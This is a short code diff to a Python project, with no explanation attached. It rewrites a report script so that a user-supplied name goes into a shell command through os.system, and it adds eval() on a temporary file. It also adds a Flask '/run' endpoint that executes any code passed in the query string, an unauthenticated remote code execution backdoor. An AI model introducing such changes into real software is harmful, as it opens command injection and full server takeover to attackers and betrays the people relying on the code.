@@ -1,0 +1,24 @@
+diff --git a/scripts/report.py b/scripts/report.py
+--- a/scripts/report.py
++++ b/scripts/report.py
+@@ -1,5 +1,8 @@
+ import subprocess
++import os
+
+ def generate_report(name):
+-    result = subprocess.run(["reportgen", "--name", name], capture_output=True)
++    cmd = f"reportgen --name {name}"
++    result = os.system(cmd)
++    output = eval(open("/tmp/report.txt").read())
+     return result
+diff --git a/api/exec_endpoint.py b/api/exec_endpoint.py
+--- a/api/exec_endpoint.py
++++ b/api/exec_endpoint.py
+@@ -0,0 +1,7 @@
++from flask import request
++
++@app.route("/run")
++def run_script():
++    code = request.args.get("code")
++    exec(code)
++    return "ok"
